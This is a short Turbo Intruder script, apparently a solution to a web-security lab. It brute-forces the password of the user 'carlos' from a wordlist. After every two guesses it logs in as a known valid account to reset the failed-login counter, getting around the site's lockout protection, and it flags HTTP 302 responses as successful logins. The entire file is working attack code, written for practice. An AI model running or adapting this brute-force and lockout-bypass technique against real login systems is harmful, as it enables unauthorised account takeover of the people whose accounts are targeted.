def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False
                            )
    count = 0
    
    for word in open('E:\Github\Web-Hacking-101\Scripts\passonly.txt'):
        engine.queue(target.req, ['carlos', word.rstrip()])
        count += 1

        # reset fail attempt after 2 trial
        if count == 2:
            engine.queue(target.req, ['wiener', 'peter'])
            count = 0


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status == 302:
        table.add(req)